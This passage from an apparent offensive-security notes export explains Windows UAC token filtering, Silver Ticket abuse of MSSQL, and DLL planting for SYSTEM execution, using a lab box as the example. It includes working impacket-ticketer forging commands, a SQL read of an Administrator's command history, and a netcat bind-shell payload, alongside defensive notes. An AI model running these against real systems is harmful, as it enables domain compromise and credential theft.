aren't granted by the type itself</strong>: they exist on <code>sverz</code> regardless. The type controls whether the <strong>filtered</strong> copy or the <strong>elevated</strong> copy is the active primary token.</p>\n<hr>\n<h2 id=\"4-runascs-default-vs-bypass-uac-logon-type-8\">4 // RunasCs Default vs <code>--bypass-uac --logon-type 8</code></h2>\n<p><a href=\"https://github.com/antonioCoco/RunasCs\"><code>antonioCoco/RunasCs</code></a> supports three internal mechanisms:</p>\n<table>\n<thead>\n<tr>\n<th>Mechanism</th>\n<th>Win32 API</th>\n<th>Effective type</th>\n<th>Filtered?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Default</td>\n<td><code>CreateProcessWithLogonW</code></td>\n<td><strong>2 (Interactive)</strong> — the API supports nothing else</td>\n<td>✅ yes</td>\n</tr>\n<tr>\n<td><code>--remote-impersonation</code></td>\n<td><code>LogonUser</code> + <code>ImpersonateLoggedOnUser</code> + <code>CreateProcess</code></td>\n<td>whatever you ask (e.g. 8)</td>\n<td>❌ no</td>\n</tr>\n<tr>\n<td><code>--bypass-uac</code></td>\n<td><code>LogonUser</code> + <code>GetTokenInformation(TokenLinkedToken)</code> + <code>DuplicateTokenEx</code> + <code>CreateProcessAsUser</code></td>\n<td>linked elevated token</td>\n<td>❌ no — High IL</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong><code>-l 8</code> alone is not enough</strong><br>\nWhen RunasCs detects that <code>CreateProcessWithLogonW</code> doesn't support type 8, it silently falls back to type 2. The warning even says so:</p>\n<p><code>[*] Warning: The function CreateProcessWithLogonW is not compatible with the\n            requested logon type '8'. Reverting to the Interactive logon type '2'.\n[*] Warning: The logon for user 'sverz' is limited.\n            Use the flag combination --bypass-uac and --logon-type '8' to\n            obtain a more privileged token.</code></p>\n</blockquote>\n<p><code>--bypass-uac</code> switches the path to:</p>\n<ol>\n<li><code>LogonUser(LOGON32_LOGON_NETWORK_CLEARTEXT)</code> — produces the filtered token.</li>\n<li><code>GetTokenInformation(filtered, TokenLinkedToken, …)</code> — retrieves a handle to the linked elevated token.</li>\n<li><code>DuplicateTokenEx(elevated, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, …)</code> — duplicates as a primary token.</li>\n<li><code>CreateProcessAsUser(elevated_dup, …)</code> — spawns the target with that elevated token.</li>\n</ol>\n<p>Result: the new <code>powershell.exe</code> runs with High IL, <code>Administrators</code> <code>Enabled</code> (not deny-only), all sensitive privileges of the full token available.</p>\n<hr>\n<h2 id=\"5-caller-prerequisites\">5 // Caller Prerequisites</h2>\n<p><code>--bypass-uac</code> is not magic. The caller (the <code>powershell</code> running as <code>mssqlsvc</code> on Signed) must be able to call <code>CreateProcessAsUser</code>, which requires one of:</p>\n<ul>\n<li><code>SeAssignPrimaryTokenPrivilege</code> (typically only <code>SYSTEM</code>)</li>\n<li><code>SeImpersonatePrivilege</code> + <code>SeIncreaseQuotaPrivilege</code> (default for service accounts like <code>mssqlsvc</code>)</li>\n</ul>\n<p>Quick check:</p>\n<pre><code class=\"language-powershell\">whoami /priv | findstr -i &quot;Impersonate Quota&quot;\n</code></pre>\n<p>If both are missing → call fails with <code>0x522</code> (privilege not held). <code>NT SERVICE\\*</code> accounts usually have them. Standard interactively-logged-in users don't.</p>\n<hr>\n<h2 id=\"6-why-winrm-would-have-solved-this-in-one-shot\">6 // Why WinRM Would Have Solved This in One Shot</h2>\n<p><code>evil-winrm -i target -u sverz -p '&lt;pwd&gt;'</code> authenticates with <strong>logon type 3</strong> (Network). The token WinRM creates for the session is already the full unfiltered one — no UAC consent, no token-linking acrobatics.</p>\n<p>On Signed though <strong>WinRM was not exposed</strong> (only <code>1433/tcp</code>). RunasCs was the workaround to get the same end state (unfiltered token) <strong>from a shell that's already on the box</strong>.</p>\n<blockquote>\n<p><strong>Practical decision tree</strong><br>\n- <strong>You have network access to the target</strong> → WinRM/SMB → type 3 → done.\n- <strong>You only have a local shell (reverse) but admin credentials for another user</strong> → RunasCs <code>--bypass-uac --logon-type 8</code> → done.\n- <strong>You have only <code>SeImpersonate</code> and no password</strong> → potato attacks (PrintSpoofer, RoguePotato, GodPotato).</p>\n</blockquote>\n<hr>\n<h2 id=\"7-verifying-the-elevated-token\">7 // Verifying the Elevated Token</h2>\n<p>Once the new reverse shell lands on the listener:</p>\n<pre><code class=\"language-powershell\">PS&gt; whoami /groups | findstr -i &quot;Administrators Mandatory&quot;\nBUILTIN\\Administrators                    Group, Enabled\nMandatory Label\\High Mandatory Level      Label\n\nPS&gt; whoami /priv\nSeImpersonatePrivilege          Enabled\nSeAssignPrimaryTokenPrivilege   Enabled\nSeIncreaseQuotaPrivilege        Enabled\nSeChangeNotifyPrivilege         Enabled\nSeManageVolumePrivilege         Enabled\nSeShutdownPrivilege             Enabled\nSeUndockPrivilege               Enabled\n…\n</code></pre>\n<p><code>Administrators</code> is <code>Enabled</code> (not deny-only), IL = High, sensitive privileges enumerated. <code>cd C:\\Users\\Administrator</code> now succeeds.</p>\n<hr>\n<h2 id=\"8-defensive-note\">8 // Defensive Note</h2>\n<ul>\n<li><strong><code>LocalAccountTokenFilterPolicy = 1</code></strong> is the registry tweak AD admins use to disable remote UAC on servers, but it opens the door to exactly these scenarios (RunasCs, PsExec, lateral SMB with local admin). Leaving it disabled (default) forces an attacker to either own <code>SeImpersonate</code> or have credentials usable with type 8/3 — raises the bar.</li>\n<li><strong>Logging Event ID 4624 with LogonType 3 or 8</strong> from workstation hosts is an IoC when unexpected — these are non-interactive logons from a context that should not normally trigger them.</li>\n<li><strong>Detecting <code>RunasCs</code> itself</strong>: it leaves a recognisable parent-child chain (<code>powershell.exe</code> parented by <code>runascs.exe</code>) and triggers Event 4648 (logon with explicit credentials).</li>\n</ul>\n<hr>\n<h2 id=\"9-tldr\">9 // TL;DR</h2>\n<ul>\n<li>Adding a user to <code>Administrators</code> does NOT give them active admin privileges if they authenticate via Interactive logon (type 2): UAC produces a <strong>filtered token</strong> (Medium IL, admin SID <code>deny-only</code>).</li>\n<li>The <strong>elevated token</strong> already exists, linked to the filtered one. You retrieve it explicitly via <code>GetTokenInformation(TokenLinkedToken)</code> + <code>CreateProcessAsUser</code>.</li>\n<li><code>RunasCs --bypass-uac --logon-type 8</code> performs exactly that sequence. <code>-l 8</code> on its own is not enough — the default API path falls back to type 2.</li>\n<li><strong>WinRM and SMB use logon type 3</strong> → never filtered by default → often the cleanest path when the ports are reachable.</li>\n<li>See Signed for the real-world application.</li>\n</ul>",
      "snippet": "BUILTIN\\Administrators                Group used for deny only      S-1-5-32-544\nMandatory Label\\Medium Mandatory Level    Label                     S-1-16-8192",
      "foot": "/notes/Logon Type 8 and UAC Filtered Tokens.md"
    },
    {
      "title": "MSSQL — Engine Identity vs Child Process Identity",
      "slug": "mssql-engine-identity-vs-child-process-identity",
      "date": "2026·04·25",
      "tags": [
        "mssql",
        "active directory",
        "kerberos",
        "silver ticket",
        "privilege escalation",
        "impersonation"
      ],
      "desc": "Context When you authenticate to MSSQL with a Kerberos ticket, two separate security contexts are in play at the same time, and they don't share privileges. Confusing them is one of the most common reasons a forged Silver Ticket gives you sysadmin on the database but a useless…",
      "body": "<h1 id=\"mssql-engine-identity-vs-child-process-identity\">MSSQL // Engine Identity vs Child Process Identity</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nWhen you authenticate to MSSQL with a Kerberos ticket, <strong>two separate security contexts are in play at the same time</strong>, and they don't share privileges. Confusing them is one of the most common reasons a forged Silver Ticket gives you <code>sysadmin</code> on the database but a useless reverse shell on the host.</p>\n<p>Real-world example: Signed_EN — <code>mssqlsvc</code> is hardened with stripped process privileges (no <code>SeImpersonate</code>), yet the SQL engine itself can still read files belonging to <code>Domain Admins</code> because the engine evaluates ACLs against the <strong>Kerberos PAC of the caller</strong>, not against the service account's primary token.</p>\n</blockquote>\n<hr>\n<h2 id=\"1-the-two-identities\">1 // The Two Identities</h2>\n<p>When a client authenticates to <code>sqlservr.exe</code> over Kerberos, the operating system materialises <strong>two distinct tokens</strong> that coexist for the lifetime of that SQL session:</p>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>Token</th>\n<th>Source</th>\n<th>Used by</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>A</strong></td>\n<td><strong>Process primary token</strong></td>\n<td>Built once at service startup from the LSA logon session of <code>mssqlsvc</code>. Reflects the privileges the service was granted at boot, after any local hardening (Local Security Policy, <code>secedit</code>, token filtering, restricted SIDs).</td>\n<td>Anything <code>sqlservr.exe</code> does as itself, and — crucially — <strong>child processes</strong> created via <code>CreateProcessAsUser</code>.</td>\n</tr>\n<tr>\n<td><strong>B</strong></td>\n<td><strong>Per-session impersonation token</strong></td>\n<td>Built per connection from the <strong>Kerberos PAC</strong> the client presents. Carries the caller's user SID and the full list of group SIDs delivered in the ticket.</td>\n<td>The engine when it accesses Windows resources <strong>on behalf of the caller</strong> (file I/O, network shares, SPN-bound resources).</td>\n</tr>\n</tbody>\n</table>\n<p>The two tokens belong to the same process but answer different questions:</p>\n<ul>\n<li><em>Who am I as a Windows process?</em> → <strong>A</strong> (primary, baked in at service start)</li>\n<li><em>On whose behalf am I currently acting?</em> → <strong>B</strong> (impersonation, driven by the Kerberos ticket)</li>\n</ul>\n<hr>\n<h2 id=\"2-why-xp_cmdshell-inherits-token-a-not-token-b\">2 // Why xp_cmdshell Inherits Token A, not Token B</h2>\n<p><code>xp_cmdshell</code> is the most popular post-exploitation primitive in MSSQL, and it is also the one most likely to mislead you about which identity you actually control.</p>\n<p>When a <code>sysadmin</code> calls <code>xp_cmdshell</code>, MSSQL does not impersonate the caller back into the spawned process. Instead it calls <code>CreateProcessAsUser</code> with <strong>its own service account token (A)</strong>:</p>\n<pre><code>sysadmin caller (Token B, from PAC)\n        │\n        │  EXEC xp_cmdshell 'whoami'\n        ▼\nsqlservr.exe ──► CreateProcessAsUser(serviceToken=A) ──► cmd.exe / whoami\n                                                               │\n                                                               ▼\n                                                    runs as mssqlsvc with\n                                                    A's stripped privileges\n</code></pre>\n<p>The child process therefore inherits <strong>whatever the host admin left on the service account at boot</strong>. If the admin ran something like:</p>\n<pre><code>secedit /configure ... → remove SeImpersonatePrivilege from mssqlsvc\n</code></pre>\n<p>then every shell you spawn through <code>xp_cmdshell</code> will be missing <code>SeImpersonate</code>, and every Potato-family exploit you upload will fail with:</p>\n<pre><code>[-] Get system token failed: The process token does not have the required privileges\n</code></pre>\n<p>This is <strong>structural</strong>, not a bug. The child has no way to see the caller's PAC.</p>\n<hr>\n<h2 id=\"3-how-bulk-openrowset-backup-use-token-b\">3 // How BULK / OPENROWSET / BACKUP Use Token B</h2>\n<p>A large family of MSSQL features touches the filesystem <strong>without ever spawning a child process</strong>. The engine itself opens the file, reads or writes bytes, and returns the result. For those operations the engine <strong>impersonates the caller</strong> before issuing the I/O — so the kernel evaluates the file ACL against <strong>Token B</strong>.</p>\n<p>Operations that follow this path (non-exhaustive):</p>\n<ul>\n<li><code>OPENROWSET(BULK …, SINGLE_CLOB | SINGLE_BLOB | SINGLE_NCLOB)</code></li>\n<li><code>BULK INSERT … FROM 'path'</code></li>\n<li><code>BACKUP DATABASE … TO DISK = 'path'</code></li>\n<li><code>RESTORE DATABASE … FROM DISK = 'path'</code></li>\n<li><code>xp_fileexist</code>, <code>xp_dirtree</code> (read-side)</li>\n</ul>\n<p>The flow looks like this:</p>\n<pre><code>sysadmin caller (Token B, from PAC: includes group SIDs)\n        │\n        │  SELECT * FROM OPENROWSET(BULK 'C:\\…\\file', SINGLE_CLOB) AS x\n        ▼\nsqlservr.exe ──► ImpersonateLoggedOnUser(B) ──► CreateFile('C:\\…\\file')\n                                                     │\n                                                     ▼\n                                          NTFS ACL check uses Token B\n                                          (i.e. the PAC's group SIDs)\n</code></pre>\n<p>If the file is readable by <code>Domain Admins</code> and the PAC says you are a member of <code>Domain Admins</code>, the read succeeds — even though <code>mssqlsvc</code> (Token A) would be denied.</p>\n<hr>\n<h2 id=\"4-why-a-silver-ticket-turns-this-into-privilege-escalation\">4 // Why a Silver Ticket Turns This Into Privilege Escalation</h2>\n<p>A Silver Ticket is a TGS you forge <strong>locally</strong> using the NT hash of a service account, without ever talking to the KDC. The key property is that <strong>you write the PAC yourself</strong>: <code>impacket-ticketer</code> decides, byte for byte, which SIDs end up in Token B when MSSQL accepts the ticket.</p>\n<p>That means an attacker holding only the service account's NT hash can:</p>\n<ol>\n<li>Forge a TGS for <code>MSSQLSvc/&lt;host&gt;:1433</code>.</li>\n<li>Embed <strong>arbitrary SIDs</strong> in the PAC — <code>Domain Admins (512)</code>, <code>Enterprise Admins (519)</code>, <code>Backup Operators (551)</code>, even local <code>BUILTIN\\Administrators (S-1-5-32-544)</code>.</li>\n<li>Authenticate to MSSQL → become <code>sysadmin</code> and acquire <strong>Token B</strong> with those SIDs.</li>\n<li>Use a Token-B-driven primitive (BULK / OPENROWSET / BACKUP) to access files protected by those groups.</li>\n</ol>\n<p>The forged SIDs never need to actually exist on the DC for <em>MSSQL</em> authorisation — the engine trusts the PAC blindly because the ticket signature checks out against the service key. The Windows kernel, when handed Token B for an impersonated I/O, also trusts those SIDs for the local ACL check.</p>\n<p>Result: <strong>MSSQL becomes an arbitrary-file-read primitive constrained only by which SIDs you can stuff into your forged PAC.</strong></p>\n<blockquote>\n<p><strong>Critical pitfall — <code>-groups</code> vs <code>-extra-sid</code></strong><br>\n<code>impacket-ticketer</code> exposes <strong>two different fields</strong> that end up in different parts of the PAC, and they are NOT interchangeable:</p>\n<ul>\n<li><strong><code>-groups</code></strong> writes to <code>LogonInfo.GroupIds</code>, which only accepts <strong>RIDs of groups in the same domain as <code>-domain-sid</code></strong>. Each value is interpreted as <code>&lt;domain-sid&gt;-&lt;rid&gt;</code>. So <code>512</code> becomes <code>S-1-5-21-…-512</code> (Domain Admins). You cannot put well-known SIDs from other authorities here (anything starting with <code>S-1-5-32-…</code>, <code>S-1-1-…</code>, etc.).</li>\n<li><strong><code>-extra-sid</code></strong> writes to <code>LogonInfo.ExtraSids</code>, which accepts <strong>fully-qualified SIDs from any authority</strong>. This is where local groups like <code>BUILTIN\\Administrators</code> (<code>S-1-5-32-544</code>) or <code>BUILTIN\\Backup Operators</code> (<code>S-1-5-32-551</code>) must go.</li>\n</ul>\n<p>Forgetting <code>-extra-sid</code> is the single most common reason an otherwise-correct OPENROWSET BULK still returns \"Access Denied\" — see Section 6.</p>\n</blockquote>\n<hr>\n<h2 id=\"5-walkthrough-reading-administrators-files-from-a-stripped-mssqlsvc\">5 // Walkthrough // Reading Administrator's Files from a Stripped <code>mssqlsvc</code></h2>\n<p>This is the exact pattern that solves Signed_EN when the host has been hardened to remove <code>SeImpersonate</code> from <code>mssqlsvc</code>.</p>\n<h3 id=\"step-1-forge-the-silver-ticket-with-the-right-sids-in-the-pac\">Step 1 // Forge the Silver Ticket with the Right SIDs in the PAC</h3>\n<pre><code class=\"language-bash\">impacket-ticketer \\\n  -nthash &lt;NT_HASH_OF_mssqlsvc&gt; \\\n  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \\\n  -domain signed.htb \\\n  -spn MSSQLSvc/DC01.signed.htb:1433 \\\n  -user-id 1103 \\\n  -groups '512,1105' \\\n  -extra-sid 'S-1-5-32-544' \\\n  doesntmatter\n</code></pre>\n<p>Why each parameter matters:</p>\n<ul>\n<li><strong><code>-user-id 1103</code></strong> = mssqlsvc's RID. Use the RID of an account that <strong>actually exists in AD</strong>. Arbitrary or well-known values (e.g. <code>500</code>) can cause LSA to refuse the token build or to skip transitive group expansion on the local machine.</li>\n<li><strong><code>-groups '512,1105'</code></strong> = <code>Domain Admins (512)</code> for cross-machine authority + <code>IT (1105)</code> because on this box that group is mapped to the <code>sysadmin</code> SQL Server role.</li>\n<li><strong><code>-extra-sid 'S-1-5-32-544'</code></strong> = <code>BUILTIN\\Administrators</code>. <strong>This is the parameter that closes the file-ACL gap.</strong> ACLs on <code>C:\\Users\\Administrator\\…</code> and most DC-side privileged paths grant access to <code>BUILTIN\\Administrators</code>, <em>not</em> directly to <code>Domain Admins</code>. On a real KDC-issued ticket the LSA would expand the membership for you; on a forged ticket the PAC contains only what you put in it. If <code>S-1-5-32-544</code> isn't in <code>ExtraSids</code>, your Token B fails the kernel ACL check even though you are \"Domain Admins\".</li>\n<li><strong>Username (<code>doesntmatter</code>)</strong> = irrelevant. Authorisation is purely SID-based.</li>\n</ul>\n<h3 id=\"step-2-authenticate\">Step 2 // Authenticate</h3>\n<pre><code class=\"language-bash\">export KRB5CCNAME=doesntmatter.ccache\nimpacket-mssqlclient -k signed.htb -windows-auth\n</code></pre>\n<p>The session is now <code>sysadmin</code> (RID 1105 → role mapping) and Token B carries <code>Domain Admins</code>.</p>\n<h3 id=\"step-3-read-a-da-only-file-via-the-engine\">Step 3 // Read a DA-only File via the Engine</h3>\n<pre><code class=\"language-sql\">SELECT BulkColumn\nFROM OPENROWSET(\n    BULK 'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',\n    SINGLE_CLOB\n) AS x;\n</code></pre>\n<p>The file lives under <code>C:\\Users\\Administrator\\</code> — a folder whose ACL denies <code>mssqlsvc</code> (Token A) but allows <code>Domain Admins</code> (Token B). The read succeeds because the engine impersonates the caller before opening the file.</p>\n<h3 id=\"step-4-pivot\">Step 4 // Pivot</h3>\n<p>The history file commonly contains password resets, DPAPI hints, scheduled-task arguments — anything the real Administrator typed. From <code>Signed_EN</code> the relevant line is a <code>Set-ADAccountPassword</code> call that hands you the new Administrator password in plaintext, completing the path to full compromise.</p>\n<hr>\n<h2 id=\"6-troubleshooting-access-denied-even-though-token-b-has-domain-admins\">6 // Troubleshooting // \"Access Denied\" Even Though Token B Has Domain Admins</h2>\n<p>This is the single most common failure mode of the technique. The MSSQL session prompt shows you authenticated as a privileged principal, <code>sysadmin</code> checks pass, but <code>OPENROWSET BULK</code> on Administrator's profile returns:</p>\n<pre><code>Cannot bulk load. The file &quot;C:\\Users\\…&quot; does not exist or you don't have file access rights.\n</code></pre>\n<p>The error message conflates two things — file-not-found and access-denied — but in this scenario it is almost always the second.</p>\n<h3 id=\"why-it-fails\">Why it fails</h3>\n<p>The Windows access-check algorithm walks the file's DACL and compares each ACE's trustee SID against the SIDs in your token. ACLs on local profiles, registry hives, and most admin-only paths grant access to <strong><code>BUILTIN\\Administrators</code> (<code>S-1-5-32-544</code>)</strong>, which is a <em>local</em> alias group on the machine. They do <strong>not</strong> typically grant access directly to <code>Domain Admins (S-1-5-21-…-512)</code>.</p>\n<p>When a real domain admin logs in via Kerberos against a real KDC, the LSA on the target machine performs <strong>local group expansion</strong>: it sees Domain Admins in the PAC, looks up local-group membership, and adds <code>S-1-5-32-544</code> to the resulting token. Your forged Silver Ticket bypasses the KDC entirely, so this expansion <strong>never happens</strong>: the kernel builds your token from the literal SIDs in the PAC and nothing else.</p>\n<p>If <code>S-1-5-32-544</code> is not in your PAC, it is not in your token, and the ACL check fails — full stop.</p>\n<h3 id=\"verifying-what-your-ccache-actually-contains\">Verifying what your ccache actually contains</h3>\n<p>Don't trust the filename. Inspect the ticket:</p>\n<pre><code class=\"language-bash\">python3 -c &quot;from impacket.krb5.ccache import CCache; \\\nc = CCache.loadFile('Administrator.ccache'); \\\n[print(cred.toTGS().__dict__) for cred in c.credentials]&quot;\n</code></pre>\n<p>Or with the impacket helper if available:</p>\n<pre><code class=\"language-bash\">impacket-describeTicket Administrator.ccache\n</code></pre>\n<p>Confirm the PAC actually contains <code>512</code> in groups <strong>and</strong> <code>S-1-5-32-544</code> in extra SIDs. If either is missing, regenerate.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Re-forge with <code>-extra-sid 'S-1-5-32-544'</code>:</p>\n<pre><code class=\"language-bash\">impacket-ticketer \\\n  -nthash &lt;NT_HASH&gt; \\\n  -domain-sid &lt;DOMAIN_SID&gt; \\\n  -domain &lt;domain&gt; \\\n  -spn MSSQLSvc/&lt;host&gt;:1433 \\\n  -user-id &lt;RID-of-real-AD-user&gt; \\\n  -groups '512,&lt;sysadmin-mapped-group-RID&gt;' \\\n  -extra-sid 'S-1-5-32-544' \\\n  doesntmatter\n</code></pre>\n<p>Then load fresh and re-authenticate:</p>\n<pre><code class=\"language-bash\">export KRB5CCNAME=$(pwd)/doesntmatter.ccache\nimpacket-mssqlclient -k &lt;host&gt; -windows-auth\n</code></pre>\n<p>Re-run the BULK read — it now succeeds.</p>\n<h3 id=\"when-youd-add-even-more-extrasids\">When you'd add even more ExtraSids</h3>\n<p>The same pattern lets you reach files gated by other local alias groups. Useful candidates depending on what you want to read:</p>\n<table>\n<thead>\n<tr>\n<th>SID</th>\n<th>Group</th>\n<th>Typical use</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>S-1-5-32-544</code></td>\n<td><code>BUILTIN\\Administrators</code></td>\n<td>Almost everything admin-only on the host. <strong>Always include.</strong></td>\n</tr>\n<tr>\n<td><code>S-1-5-32-551</code></td>\n<td><code>BUILTIN\\Backup Operators</code></td>\n<td>Files where only Backup Operators have read access (rare on default boxes, more common on hardened ones).</td>\n</tr>\n<tr>\n<td><code>S-1-5-32-549</code></td>\n<td><code>BUILTIN\\Server Operators</code></td>\n<td>DC-specific operator-protected resources.</td>\n</tr>\n<tr>\n<td><code>S-1-5-9</code></td>\n<td><code>Enterprise Domain Controllers</code></td>\n<td>Resources gated to \"DCs only\", e.g. some replication paths.</td>\n</tr>\n</tbody>\n</table>\n<p>Each goes in <code>-extra-sid</code>, comma-separated.</p>\n<hr>\n<h2 id=\"7-what-else-token-b-unlocks\">7 // What Else Token B Unlocks</h2>\n<p>Once you internalise that Token B is the engine's effective identity for impersonated I/O, a number of \"stuck\" scenarios become tractable:</p>\n<ul>\n<li><strong>Read backup files / NTDS dumps</strong> lying in DA-protected folders.</li>\n<li><strong>Read Group Policy preferences XML</strong> (<code>\\\\dc\\SYSVOL\\…\\Groups.xml</code>) when the SQL service account can't but a domain group in your PAC can.</li>\n<li><strong>Write to a share</strong> by including a group with write ACLs (<code>BACKUP DATABASE … TO DISK = '\\\\dc\\share\\file.bak'</code>).</li>\n<li><strong>Plant a DLL into <code>System32</code> and pivot to SYSTEM</strong> — Token B authorises the write to <code>C:\\Windows\\System32\\</code>, but <code>BACKUP DATABASE</code> produces SQL-backup format (not <code>MZ</code> bytes), so the actual write goes through a <strong>CLR <code>UNSAFE</code> assembly running in-process</strong> that calls <code>File.WriteAllBytes</code> under impersonation. See Privileged File Write to SYSTEM RCE for the why and Section 8 for the complete copy-pasteable command sequence (CLR helper, hex conversion, <code>EXEC dbo.WriteFileBytes</code> for <code>phoneinfo.dll</code> / <code>WerTrigger.exe</code> / <code>Report.wer</code>, trigger via <code>xp_cmdshell</code>).</li>\n<li><strong>Cross-protocol abuse</strong>: any feature that ends up calling <code>CreateFile</code>/<code>SMB</code> with impersonation honours Token B.</li>\n</ul>\n<p>Conversely, anything that fans out into a <strong>child process</strong> (<code>xp_cmdshell</code>, CLR with <code>UNSAFE</code>, <code>sp_OACreate</code> shelling out, Agent jobs running under the service account) inherits <strong>Token A</strong> and is bound by whatever the host admin left on the service.</p>\n<hr>\n<h2 id=\"8-defensive-notes\">8 // Defensive Notes</h2>\n<p>For defenders this is the takeaway:</p>\n<ul>\n<li>Hardening the <strong>process token</strong> of <code>mssqlsvc</code> (removing <code>SeImpersonate</code>, restricted SIDs) protects against <strong>child-process pivots</strong> but does <strong>not</strong> protect against PAC-driven file access.</li>\n<li>Silver Tickets cannot be forged without the service NT hash. <strong>Rotate the <code>mssqlsvc</code> password regularly</strong> and prefer <strong>gMSAs</strong> so the rotation is automatic.</li>\n<li><code>OPENROWSET BULK</code> and ad-hoc remote queries are off by default for a reason — keep <code>Ad Hoc Distributed Queries</code> and <code>xp_cmdshell</code> disabled at the server level, and audit <code>BULK</code> usage.</li>\n<li>Treat MSSQL as a <strong>trusted I/O agent of the calling Kerberos identity</strong>, not as a process pinned to its service account.</li>\n</ul>\n<hr>\n<h2 id=\"9-tldr\">9 // TL;DR</h2>\n<ul>\n<li><code>sqlservr.exe</code> carries <strong>two tokens at once</strong>: the service account's primary token (A) and a per-session impersonation token (B) built from the caller's Kerberos PAC.</li>\n<li><strong><code>xp_cmdshell</code> and other child-process primitives use Token A</strong> → they are limited by whatever the host admin left on the service account.</li>\n<li><strong><code>OPENROWSET BULK</code>, <code>BULK INSERT</code>, <code>BACKUP</code>, <code>RESTORE</code> use Token B</strong> → they are limited only by the SIDs you put into the PAC.</li>\n<li>A <strong>Silver Ticket</strong> lets you write the PAC by hand, so Token B can be made to carry <code>Domain Admins</code> (or any other group) and bypass file ACLs the service account would never get past.</li>\n<li><strong>Mandatory operational detail</strong>: forged PACs do not get <strong>local group expansion</strong> the way real KDC-issued tickets do. To read paths whose ACL grants <code>BUILTIN\\Administrators</code>, you must inject <code>S-1-5-32-544</code> directly via <code>-extra-sid</code>. Without it, you get \"Access Denied\" even though the PAC says you are Domain Admin.</li>\n<li>Concrete case study: Signed_EN — same shell, same stripped service account, but reading the Administrator's PowerShell history is trivial once you stop fighting Token A and start abusing Token B.</li>\n</ul>",
      "snippet": "sysadmin caller (Token B, from PAC)\n        │\n        │  EXEC xp_cmdshell 'whoami'\n        ▼",
      "foot": "/notes/MSSQL Engine Identity vs Child Process Identity.md"
    },
    {
      "title": "Privileged File Write to SYSTEM RCE",
      "slug": "privileged-file-write-to-system-rce",
      "date": "2026·04·26",
      "tags": [
        "windows",
        "privilege escalation",
        "dll hijacking",
        "file write",
        "mssql"
      ],
      "desc": "Context Once you control an arbitrary write under C:\\Windows\\System32\\ (or a privileged directory creation primitive), the attack reduces to planting a DLL where a SYSTEM process will load it. The vulnerability that gave you the write is irrelevant past this point — what…",
      "body": "<h1 id=\"privileged-file-write-from-arbitrary-write-to-nt-authoritysystem\">Privileged File Write // From Arbitrary Write to NT AUTHORITY\\SYSTEM</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nOnce you control an arbitrary write under <code>C:\\Windows\\System32\\</code> (or a privileged directory creation primitive), the attack reduces to <strong>planting a DLL where a SYSTEM process will load it</strong>. The vulnerability that gave you the write is irrelevant past this point — what matters is which Windows component you can coerce into loading your DLL.</p>\n<p>Real-world delivery via MSSQL: see MSSQL Engine Identity vs Child Process Identity. A forged Silver Ticket gives Token B <code>Domain Admins</code> + <code>BUILTIN\\Administrators</code>; the engine then impersonates the caller for SMB I/O, which means writes to <code>\\\\&lt;host&gt;\\C$\\Windows\\System32\\</code> succeed even when the service account itself would be denied.</p>\n</blockquote>\n<hr>\n<h2 id=\"1-the-structural-pattern\">1 // The Structural Pattern</h2>\n<p>All four techniques below share the same shape:</p>\n<ol>\n<li>A <strong>trusted SYSTEM-context process</strong> (auto-elevated service, auto-launched COM server) is hardcoded to load a specific DLL by name.</li>\n<li>That DLL <strong>does not exist</strong> on a default install, <strong>OR</strong> the load order is hijackable, <strong>OR</strong> the parent looks for the DLL in a directory you can create.</li>\n<li>You drop your payload at the expected path and <strong>trigger the loader</strong>.</li>\n</ol>\n<p>The write primitive supplies step 2; these techniques supply step 3.</p>\n<hr>\n<h2 id=\"2-diaghub-collectorservice\">2 // DiagHub (CollectorService)</h2>\n<blockquote>\n<p><strong>Patched</strong><br>\nBroken since Windows 10 <strong>1903</strong>. Still relevant on legacy targets and CTF labs running older builds.</p>\n</blockquote>\n<p>The Microsoft Diagnostics Hub Standard Collector Service is a SYSTEM-context DCOM server. Its <code>IStandardCollectorService</code> interface accepts a path argument that ends up in a <code>LoadLibrary</code> call inside the service — but the load is constrained to DLLs already living in <code>C:\\Windows\\System32\\</code>.</p>\n<p><strong>Steps</strong></p>\n<ol>\n<li>Drop <code>payload.dll</code> into <code>C:\\Windows\\System32\\</code> via your write primitive.</li>\n<li>Build <a href=\"https://github.com/xct/diaghub\"><code>xct/diaghub</code></a>.</li>\n<li>Trigger:</li>\n</ol>\n<p><code>diaghub.exe c:\\\\ProgramData\\\\ payload.dll</code></p>\n<p>The default payload runs <code>C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe</code>.</p>\n<p>Alternative implementations: <code>Accenture/AARO-Bugs/CVE-2020-5825/TrigDiag</code>, <code>decoder-it/diaghub_exploit</code>.</p>\n<hr>\n<h2 id=\"3-usodllloader\">3 // UsoDllLoader</h2>\n<blockquote>\n<p><strong>Patched on recent Insider builds</strong><br>\nJames Forshaw's successor to DiagHub. Killed in late Win10 Insider Preview, but still works on most production builds at the time of writing.</p>\n</blockquote>\n<p>The Update Session Orchestrator (USO) service auto-loads <code>WindowsCoreDeviceInfo.dll</code> from <code>System32</code> when scheduled scans fire. The DLL <strong>does not ship with Windows</strong> — the import is satisfied only if a third party drops one. Plant your own and the USO service will load it as SYSTEM.</p>\n<p><strong>Steps</strong></p>\n<ol>\n<li>Build <a href=\"https://github.com/itm4n/UsoDllLoader\"><code>itm4n/UsoDllLoader</code></a> (Release / x64). Output:\n   - <code>x64\\Release\\WindowsCoreDeviceInfo.dll</code>\n   - <code>x64\\Release\\UsoDllLoader.exe</code></li>\n<li>Copy <code>WindowsCoreDeviceInfo.dll</code> to <code>C:\\Windows\\System32\\</code>.</li>\n<li>Trigger one of:\n   - <code>UsoDllLoader.exe</code> (waits and forces the scan).\n   - <code>usoclient StartInteractiveScan</code> + connect to the bind shell on port 1337.</li>\n</ol>\n<hr>\n<h2 id=\"4-wertrigger-windows-error-reporting\">4 // WerTrigger (Windows Error Reporting)</h2>\n<p>Abuses Windows Problem Reporting (<code>WerFault.exe</code>, SYSTEM) by feeding it a crafted <code>Report.wer</code> file. WER loads 